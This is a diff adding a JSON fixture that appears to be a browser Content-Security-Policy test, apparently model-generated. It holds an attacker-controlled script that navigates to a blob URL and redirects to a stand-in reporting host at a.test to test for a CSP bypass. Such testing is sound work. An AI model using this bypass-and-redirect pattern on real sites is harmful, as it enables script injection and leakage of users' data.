@@ -1,0 +1,15 @@
+```json
+{
+  "c799747": {
+    "leak.test": {
+      "main": {
+        "index.html": "<body>\n  <script nonce=\"test\">\n    var attackerControlledString = \"<script>document.location.href='https://a.test/report/?leak=c799747'</script>\";\n    var blob = new Blob([attackerControlledString], {type : 'text/html'});\n    var url = URL.createObjectURL(blob);\n    location.href = url;\n  </script>\n</body>\n",
+        "headers.json": "[\n  {\n    \"key\": \"Content-Security-Policy\",\n    \"value\": \"script-src 'nonce-test'\"\n  }\n]"
+      }
+    }
+  }
+}
+```
+
+
+Prompt tokens: 21194Completion tokens: 168Total tokens: 21362
